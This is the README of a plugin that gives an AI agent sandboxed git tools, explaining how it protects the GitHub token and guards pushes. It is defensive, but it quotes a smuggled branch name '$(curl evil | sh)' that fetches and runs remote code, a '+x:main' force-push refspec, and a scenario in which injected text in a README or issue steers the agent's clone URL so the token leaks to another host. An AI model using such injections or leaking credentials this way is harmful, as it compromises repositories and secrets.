# `@loopingai/plugins/repo`

Clone, commit, push a work branch, open a pull request.

```ts
import { repo } from "@loopingai/plugins/repo";

repo({
  exec: (cmd, opts) => sandbox.exec(cmd, opts),
  token: () => env.GITHUB_TOKEN
});
```

Tools: `repo_clone`, `repo_status`, `repo_diff`, `repo_commit`, `repo_push`,
`repo_open_pr`.

`exec` is injected rather than importing `/sandbox` directly, so the two stay
independent — a host with its own container can use this against that, and the
tests need no container at all.

## Where the token lives

Nowhere the model or the container can read it:

- **Never in a command string.** A command line is echoed into stdout, into
  stderr on failure, into shell history, and into any VCR cassette. The token
  goes through `exec`'s per-command `env`, and `git` reads it back via a
  credential helper. Embedding it in the remote URL — the obvious alternative —
  writes it into `.git/config`, where it survives the command.
- **Never offered to a host you did not allow.** This is the one that is easy to
  miss. A helper installed as plain `credential.helper` answers for _every_ host
  — it never sees which one git is asking about — so a clone URL pointing
  anywhere makes git hand the token over the moment that server replies `401`.
  And the clone URL is model input: a repository README, an issue body, or a page
  a co-installed browser plugin fetched is enough to choose it. So the helper is
  bound to `credential.<origin>.helper`, and the URL's host must be on
  `allowedHosts` (default: `github.com`) before anything runs at all.
- **Pull requests are opened from the Worker.** The GitHub REST call happens on
  the Worker side, so the credential that can write to the repository through
  the API never crosses into the container at all.

The same mechanism carries every **model-authored** value — URLs, branch names,
commit messages — as an environment variable rather than interpolating it into a
command, so a branch name of `$(curl evil | sh)` is inert text.

## Guardrails are in the tool, not the prompt

`repo_push` refuses, before running anything, in three layers — a guardrail a
model can talk itself out of is not a guardrail:

1. **Anything that is not a plain branch name.** `git push origin <name>` reads
   `<name>` as a _refspec_, so `+x:main` is a force push to main and `x:main` an
   ordinary one — neither of which a list of forbidden names ever sees, because
   it only compares literal strings.
2. **`main`, `master`, `trunk`, `develop`.**
3. **The repository's own default branch**, read from the remote. A repo whose
   trunk is `release` deserves the same protection, and only the remote can say.

It then refuses a fourth thing, after switching to the branch: **a branch with no
commits the default branch does not already have.** Pushing one succeeds,
`repo_open_pr` opens an empty pull request on it, and the round reports a URL as
if the work had landed — the one outcome worse than an error.

`repo_push` **switches to** an existing branch and only creates a missing one. It
used to use `git checkout -B`, which is create-or-_reset_, and that destroyed a
real commit: a model committed, saved the commit with `git branch coder/x`, then
went back to the default branch and reset — and `checkout -B` force-moved
`coder/x` back to where HEAD now was.

`repo_clone` is re-entrant, because a container that outlives its task comes back
with the checkout still in it. It fetches and resets a clean one, and **refuses a
dirty one** rather than resetting over the top: those changes are a previous
task's work, and discarding them is the one outcome nobody can undo.

## Output is bounded

Every tool truncates from the middle at `maxOutputBytes` (16 KB by default), the
same way `sb_exec` does. `repo_diff` also takes `stat: true` for a per-file
changed-line summary — the right first call on a large change, and the only
practical one for an agent whose entire view of the work is the diff.

## Requirements

A `GITHUB_TOKEN` secret with contents + pull-request write, and a sandbox with
`git` on it.
